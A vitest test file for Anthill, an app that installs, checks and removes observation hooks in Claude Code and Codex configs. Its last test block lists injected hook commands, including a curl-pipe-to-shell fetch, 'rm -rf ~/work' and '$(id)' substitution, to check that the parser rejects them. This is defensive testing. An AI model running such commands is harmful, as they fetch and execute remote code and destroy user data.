import { mkdir, mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";

import { describe, expect, it } from "vitest";
import type { ChildProcessLike, SpawnFn } from "@anthill/runtimes";

import { ObservationSetupService, parseHookCommand } from "./setup.js";

type Script = { stdout?: string; stderr?: string; exitCode?: number; error?: NodeJS.ErrnoException };
type Recorded = { command: string; args: string[]; stdin: string };

function fakeSpawn(scripts: Script[]): { spawnFn: SpawnFn; calls: Recorded[] } {
  const calls: Recorded[] = [];
  let index = 0;

  const spawnFn: SpawnFn = (command, args) => {
    const script = scripts[Math.min(index, scripts.length - 1)];
    index += 1;
    const call: Recorded = { command, args: [...args], stdin: "" };
    calls.push(call);

    const listeners = new Map<string, ((...args: unknown[]) => void)[]>();
    const stdoutListeners = new Map<string, ((...args: unknown[]) => void)[]>();
    const stderrListeners = new Map<string, ((...args: unknown[]) => void)[]>();
    const on = (target: Map<string, ((...args: unknown[]) => void)[]>) =>
      (event: string, listener: (...args: unknown[]) => void) => {
        target.set(event, [...(target.get(event) ?? []), listener]);
        return undefined;
      };
    const emit = (target: Map<string, ((...args: unknown[]) => void)[]>, event: string, ...payload: unknown[]) => {
      for (const listener of target.get(event) ?? []) listener(...payload);
    };

    const child: ChildProcessLike = {
      stdout: { on: on(stdoutListeners), setEncoding: () => undefined },
      stderr: { on: on(stderrListeners), setEncoding: () => undefined },
      stdin: {
        write: (chunk: string) => {
          call.stdin += chunk;
          return true;
        },
        end: () => undefined,
        on: () => undefined,
      },
      on: on(listeners),
      kill: () => undefined,
    };

    queueMicrotask(() => {
      if (script.error) {
        emit(listeners, "error", script.error);
        return;
      }
      if (script.stdout) emit(stdoutListeners, "data", script.stdout);
      if (script.stderr) emit(stderrListeners, "data", script.stderr);
      emit(listeners, "close", script.exitCode ?? 0);
    });

    return child;
  };

  return { spawnFn, calls };
}

async function paths(handler = "// test handler\n") {
  const root = await mkdtemp(join(tmpdir(), "anthill-live-setup-"));
  const hookHandlerPath = join(root, "live-hook-handler.js");
  await writeFile(hookHandlerPath, handler, "utf8");
  return {
    root,
    prefsPath: join(root, "prefs.json"),
    claudeConfigPath: join(root, ".claude", "settings.json"),
    codexConfigPath: join(root, ".codex", "hooks.json"),
    hookHandlerPath,
    // Named explicitly, as it is in the app: a hook must not depend on
    // whatever PATH the harness happens to hand it.
    execPath: process.execPath,
  };
}

async function exists(path: string): Promise<boolean> {
  return stat(path).then(
    () => true,
    () => false,
  );
}

async function json(path: string): Promise<Record<string, unknown>> {
  return JSON.parse(await readFile(path, "utf8")) as Record<string, unknown>;
}

const missing = (): NodeJS.ErrnoException =>
  Object.assign(new Error("spawn ENOENT"), { code: "ENOENT" });

describe("local observation setup service", () => {
  it("detects local CLIs without writing setup files", async () => {
    const p = await paths();
    const { spawnFn, calls } = fakeSpawn([{ stdout: "Claude 1.0\n" }, { error: missing() }]);
    const service = new ObservationSetupService(p, spawnFn);

    const status = await service.status();

    expect(calls.map((call) => [call.command, call.args])).toEqual([
      ["claude", ["--version"]],
      ["codex", ["--version"]],
    ]);
    expect(status.harnesses[0]).toMatchObject({
      id: "claude-code",
      cliAvailable: true,
      version: "Claude 1.0",
      hookInstalled: false,
    });
    expect(status.harnesses[1]).toMatchObject({ id: "codex", cliAvailable: false });
    expect(await exists(p.claudeConfigPath)).toBe(false);
    expect(await exists(p.codexConfigPath)).toBe(false);
    expect(await exists(p.prefsPath)).toBe(false);
  });

  it("exposes the exact review material the renderer shows before enabling hooks", async () => {
    const p = await paths();
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService(p, spawnFn);

    const claude = (await service.status()).harnesses.find((item) => item.id === "claude-code");

    expect(claude?.configPath).toBe(p.claudeConfigPath);
    expect(claude?.hookHandlerPath).toBe(p.hookHandlerPath);
    expect(claude?.installerAction).toContain("No shell installer command is run");
    expect(claude?.hookCommands).toContain(
      `ELECTRON_RUN_AS_NODE=1 "${process.execPath}" "${p.hookHandlerPath}" anthill-observation-hook claude-code PreToolUse`,
    );
    expect(claude?.eventCategories).toContain("Tool start");
    expect(claude?.localDataBoundary).toContain("MCP is optional");
    expect(claude?.changes.join("\n")).toContain("do not start, attach to, stop, or steer");
  });

  it("persists a deliberate dismissal", async () => {
    const p = await paths();
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService(p, spawnFn);

    await service.dismiss();

    expect((await json(p.prefsPath)).dismissed).toBe(true);
  });

  it("merges Anthill hooks only after explicit install and preserves unrelated hooks", async () => {
    const p = await paths();
    await mkdir(dirname(p.claudeConfigPath), { recursive: true });
    await writeFile(
      p.claudeConfigPath,
      JSON.stringify({
        hooks: {
          PreToolUse: [{ matcher: "Bash", hooks: [{ type: "command", command: "echo keep" }] }],
        },
        other: true,
      }),
      "utf8",
    );
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }, { stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService(p, spawnFn);

    const result = await service.install("claude-code");

    expect(result.ok).toBe(true);
    expect(result.backupPath).toContain(".anthill-backup-");
    const config = await json(p.claudeConfigPath);
    expect(config.other).toBe(true);
    const hooks = config.hooks as Record<string, unknown[]>;
    expect(JSON.stringify(hooks.PreToolUse)).toContain("echo keep");
    expect(JSON.stringify(hooks.PreToolUse)).toContain("anthill-observation-hook claude-code PreToolUse");
    expect(JSON.stringify(hooks.Stop)).toContain("anthill-observation-hook claude-code Stop");
    const prefs = await json(p.prefsPath);
    expect(prefs.dismissed).toBe(true);
    expect(JSON.stringify(prefs)).toContain("installedAt");
  });

  it("fails safely when the hook handler is missing", async () => {
    const p = await paths();
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService({ ...p, hookHandlerPath: join(p.root, "missing.js") }, spawnFn);

    const result = await service.install("codex");

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("hook handler was not found");
    expect(await exists(p.codexConfigPath)).toBe(false);
  });

  it("disables only Anthill-owned hook entries", async () => {
    const p = await paths();
    const anthill = `ELECTRON_RUN_AS_NODE=1 "${process.execPath}" "${p.hookHandlerPath}" anthill-observation-hook codex PreToolUse`;
    await mkdir(dirname(p.codexConfigPath), { recursive: true });
    await writeFile(
      p.codexConfigPath,
      JSON.stringify({
        hooks: {
          PreToolUse: [
            { hooks: [{ type: "command", command: "echo keep" }] },
            { hooks: [{ type: "command", command: anthill }] },
          ],
        },
      }),
      "utf8",
    );
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }, { stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService(p, spawnFn);

    const result = await service.disable("codex");

    expect(result.ok).toBe(true);
    const config = await json(p.codexConfigPath);
    expect(JSON.stringify(config)).toContain("echo keep");
    expect(JSON.stringify(config)).not.toContain("anthill-observation-hook");
    expect(JSON.stringify(await json(p.prefsPath))).toContain("disabledAt");
  });

  it("rejects unsupported harness ids at the IPC boundary", async () => {
    const p = await paths();
    const { spawnFn } = fakeSpawn([{ stdout: "1.0" }, { stdout: "2.0" }]);
    const service = new ObservationSetupService(p, spawnFn);

    const result = await service.install("bogus" as never);

    expect(result.ok).toBe(false);
    if (!result.ok) expect(result.error).toContain("Unsupported observation harness");
  });
});

/**
 * Verifying that hooks work, not merely that they were written.
 *
 * ANT-23. Verification checked that the entries were in the config and that
 * the handler file existed on disk. Both were true on a machine where every
 * hook had been failing since installation: the interpreter the command named
 * was not on the harness's PATH. Entries prove the install wrote something.
 * Only running the thing proves the harness can run it.
 */
describe("hooks that were installed and do not run", () => {
  // Two version probes, then the handler probe — status() checks the CLIs
  // first and only probes a harness whose entries are present.
  const versions: Script[] = [{ stdout: "1.0\n" }, { stdout: "1.0\n" }];

  async function afterInstall(probe: Script) {
    const p = await paths();
    const { spawnFn, calls } = fakeSpawn([...versions, probe]);
    const service = new ObservationSetupService(p, spawnFn);
    await service.install("claude-code");
    const status = await service.status();
    return {
      p,
      calls,
      claude: status.harnesses.find((item) => item.id === "claude-code"),
    };
  }

  it("calls a working handler enabled", async () => {
    const { claude } = await afterInstall({ exitCode: 0 });
    expect(claude?.hookEntriesPresent).toBe(true);
    expect(claude?.hookInstalled).toBe(true);
    expect(claude?.hookProblem).toBeUndefined();
  });

  it("refuses the enabled state to a handler that exits non-zero, and says why", async () => {
    const { claude } = await afterInstall({ stderr: "Bun not found\n", exitCode: 127 });
    // The entries are there — that much the install did.
    expect(claude?.hookEntriesPresent).toBe(true);
    // But nothing about them works, so nothing claims they do.
    expect(claude?.hookInstalled).toBe(false);
    expect(claude?.hookProblem).toContain("127");
    expect(claude?.hookProblem).toContain("Bun not found");
  });

  it("refuses the enabled state to a handler that cannot be started at all", async () => {
    const { claude } = await afterInstall({ error: missing() });
    expect(claude?.hookEntriesPresent).toBe(true);
    expect(claude?.hookInstalled).toBe(false);
    expect(claude?.hookProblem).toContain("could not be started");
  });

  /**
   * The command the config carries, spawned as a program rather than as a line
   * of shell.
   *
   * It is still the stored entry being checked and not the one Anthill would
   * write today — an install from an older version, naming an interpreter that
   * has since moved, has to fail this check. What changed is that its pieces
   * go to `spawn` as argv, so there is no shell to interpret them (ANT-102).
   */
  it("probes the command the config carries, without a shell", async () => {
    const { p, calls } = await afterInstall({ exitCode: 0 });
    const probe = calls[calls.length - 1];
    expect(probe.command).toBe(p.execPath);
    expect(probe.args[0]).toBe(p.hookHandlerPath);
    expect(probe.args[1]).toBe("anthill-observation-hook");
    expect(calls.some((call) => call.command === "/bin/sh")).toBe(false);
  });

  it("refuses to call a PATH-dependent command working, without even running it", async () => {
    const p = await paths();
    const { spawnFn, calls } = fakeSpawn([...versions, { exitCode: 0 }]);
    const service = new ObservationSetupService(p, spawnFn);
    await service.install("claude-code");
    // Rewrite the entries the way an older Anthill wrote them: a bare
    // interpreter name, resolved against whatever PATH the harness has.
    const config = JSON.parse(await readFile(p.claudeConfigPath, "utf8")) as {
      hooks: Record<string, { hooks: { command: string }[] }[]>;
    };
    for (const entries of Object.values(config.hooks)) {
      for (const entry of entries) {
        for (const hook of entry.hooks) {
          hook.command = hook.command.replace(/^ELECTRON_RUN_AS_NODE=1 "[^"]+"/, "node");
        }
      }
    }
    await writeFile(p.claudeConfigPath, JSON.stringify(config), "utf8");
    const before = calls.length;

    const claude = (await service.status()).harnesses.find((item) => item.id === "claude-code");
    expect(claude?.hookEntriesPresent).toBe(true);
    expect(claude?.hookInstalled).toBe(false);
    expect(claude?.hookProblem).toContain("PATH");
    // Such a command can succeed here and still fail every time it fires, so
    // running it would answer a question nobody asked.
    expect(calls.slice(before).some((call) => call.command === "/bin/sh")).toBe(false);
  });

  it.each(["executable", "handler", "event", "swapped event"])("does not probe a config with a substituted %s", async (field) => {
    const p = await paths();
    const { spawnFn, calls } = fakeSpawn([...versions, { exitCode: 0 }]);
    const service = new ObservationSetupService(p, spawnFn);
    await service.install("claude-code");
    const config = JSON.parse(await readFile(p.claudeConfigPath, "utf8"));
    const groups = Object.values(config.hooks) as { hooks: { command: string }[] }[][];
    // Alter a later entry, not just the command chosen for the one probe.
    const hook = groups[groups.length - 1][0].hooks[0];
    hook.command = field === "executable" ? hook.command.replace(p.execPath, "/tmp/untrusted-program")
      : field === "handler" ? hook.command.replace(p.hookHandlerPath, "/tmp/untrusted-handler.js")
      : hook.command.replace(/\S+$/, field === "swapped event" ? "PreToolUse" : "InvalidEvent");
    await writeFile(p.claudeConfigPath, JSON.stringify(config));
    const before = calls.length;
    const status = (await service.status()).harnesses.find((item) => item.id === "claude-code");
    expect(status?.hookInstalled).toBe(false);
    expect(status?.hookProblem).toContain("No config command was run");
    expect(calls.slice(before).every((call) => call.args[0] === "--version")).toBe(true);
  });

  it("says nothing about a harness that was never enabled", async () => {
    const p = await paths();
    const { spawnFn, calls } = fakeSpawn(versions);
    const service = new ObservationSetupService(p, spawnFn);
    const claude = (await service.status()).harnesses.find((item) => item.id === "claude-code");
    expect(claude?.hookEntriesPresent).toBe(false);
    expect(claude?.hookInstalled).toBe(false);
    expect(claude?.hookProblem).toBeUndefined();
    // And nothing was run on its behalf: there is no install to check.
    expect(calls.some((call) => call.command === "/bin/sh")).toBe(false);
  });

  it("names the interpreter absolutely, so no PATH decides whether a hook runs", async () => {
    const p = await paths();
    const service = new ObservationSetupService(p, fakeSpawn(versions).spawnFn);
    const claude = (await service.status()).harnesses.find((item) => item.id === "claude-code");
    for (const command of claude?.hookCommands ?? []) {
      expect(command).toContain(p.execPath);
      expect(command.startsWith("node ")).toBe(false);
    }
  });
});


/**
 * ANT-42. Running the command proves Anthill can run it, which is not the same
 * as the harness ever doing so. Codex had six entries written with an absolute
 * interpreter path, a handler that ran on demand, and across eight sessions
 * not one event — while Claude Code wrote hundreds to the same log in the same
 * period, so neither the log nor the handler was at fault. The card said
 * Enabled throughout.
 */
describe("hooks that run and are never called", () => {
  const versions: Script[] = [{ stdout: "1.0\n" }, { stdout: "1.0\n" }];

  async function installed(log?: string) {
    const p = await paths();
    const hookLogPath = join(p.root, "events.jsonl");
    if (log !== undefined) await writeFile(hookLogPath, log, "utf8");
    const { spawnFn } = fakeSpawn([...versions, { exitCode: 0 }]);
    const service = new ObservationSetupService({ ...p, hookLogPath }, spawnFn);
    await service.install("claude-code");
    const status = await service.status();
    return status.harnesses.find((item) => item.id === "claude-code");
  }

  const event = (harness: string, at: string) =>
    `${JSON.stringify({ source: "anthill-observation-hook", harness, eventType: "PreToolUse", recordedAt: at })}\n`;

  it("says nothing has arrived when nothing has", async () => {
    const claude = await installed("");
    expect(claude?.hookEntriesPresent).toBe(true);
    // The command runs — that part of ANT-23 still holds.
    expect(claude?.hookInstalled).toBe(true);
    expect(claude?.hookProblem).toBeUndefined();
    // But nothing has come through it, so nothing says it is delivering.
    expect(claude?.hookLastEventAt).toBeUndefined();
  });

  it("reports the last event once one has", async () => {
    const claude = await installed(
      event("claude-code", "2026-09-04T10:00:00.000Z") + event("claude-code", "2026-09-04T11:00:00.000Z"),
    );
    expect(claude?.hookLastEventAt).toBe("2026-09-04T11:00:00.000Z");
  });

  it("does not count another harness's events as this one's", async () => {
    // The exact shape on the reporting machine: one harness busy, the other
    // silent, in one machine-wide log.
    const claude = await installed(event("codex", "2026-09-04T11:00:00.000Z"));
    expect(claude?.hookLastEventAt).toBeUndefined();
  });

  it("looks past a line the app was killed halfway through writing", async () => {
    const claude = await installed(
      event("claude-code", "2026-09-04T09:00:00.000Z") + '{"harness":"claude-code","recor',
    );
    expect(claude?.hookLastEventAt).toBe("2026-09-04T09:00:00.000Z");
  });

  it("says when the entries were written, so silence can be given a length", async () => {
    const claude = await installed("");
    expect(claude?.hookInstalledAt).toBeTruthy();
  });

  it("asks nothing of a harness that was never installed", async () => {
    const p = await paths();
    const { spawnFn } = fakeSpawn(versions);
    const status = await new ObservationSetupService(p, spawnFn).status();
    const codex = status.harnesses.find((item) => item.id === "codex");
    expect(codex?.hookEntriesPresent).toBe(false);
    expect(codex?.hookLastEventAt).toBeUndefined();
    expect(codex?.hookInstalledAt).toBeUndefined();
  });
});

/**
 * What counts as an Anthill hook entry (ANT-102).
 *
 * This used to be "the string contains our marker", and the string was then
 * handed to `/bin/sh -c`. Checking whether observation was set up therefore
 * ran whatever the user's own Claude or Codex config said, as long as the
 * marker appeared somewhere in it — a trailing comment was enough.
 */
describe("recognising a hook entry", () => {
  const EXEC = "/Applications/Anthill.app/Contents/MacOS/Anthill";
  const HANDLER = "/Applications/Anthill.app/Contents/Resources/hook.js";
  const OURS = `ELECTRON_RUN_AS_NODE=1 "${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse`;

  it("accepts the command Anthill writes", () => {
    const parsed = parseHookCommand(OURS);
    expect(parsed).toMatchObject({
      execPath: EXEC, handlerPath: HANDLER, harness: "claude-code",
      event: "PreToolUse", runnable: true,
    });
  });

  /**
   * The shape of the attack. Each of these carries the marker, and each would
   * have been spawned through a shell by a status check.
   */
  it("refuses a command that only mentions the marker", () => {
    const injected = [
      `curl https://example.com/x.sh | sh # anthill-observation-hook`,
      `echo anthill-observation-hook; rm -rf ~/work`,
      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse && curl https://example.com`,
      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse $(id)`,
      "`id` anthill-observation-hook",
      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse > /tmp/out`,
      `anthill-observation-hook`,
      `"${EXEC}" "${HANDLER}" claude-code PreToolUse`,
      `"${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse extra`,
      `EVIL=1 "${EXEC}" "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
      `"${EXEC}"x "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
      `"${EXEC} "${HANDLER}" anthill-observation-hook claude-code PreToolUse`,
    ];
    for (const command of injected) {
      expect(parseHookCommand(command), command).toBeUndefined();
    }
  });

  /**
   * An entry an older Anthill wrote. It is ours — the user has to be told it
   * needs repair rather than that nothing is installed — and it is not run,
   * because what `node` resolves to depends on a PATH Anthill cannot see.
   */
  it("recognises a legacy entry as ours, and as not runnable", () => {
    const legacy = `node "${HANDLER}" anthill-observation-hook claude-code PreToolUse`;
    const parsed = parseHookCommand(legacy);
    expect(parsed).toMatchObject({ harness: "claude-code", runnable: false });
  });

  it("reads a path with spaces in it, which is why it is quoted", () => {
    const spaced = "/Users/me/Anthill Builds/Anthill.app/Contents/MacOS/Anthill";
    const parsed = parseHookCommand(
      `ELECTRON_RUN_AS_NODE=1 "${spaced}" "${HANDLER}" anthill-observation-hook codex Stop`,
    );
    expect(parsed).toMatchObject({ execPath: spaced, harness: "codex", event: "Stop", runnable: true });
  });
});
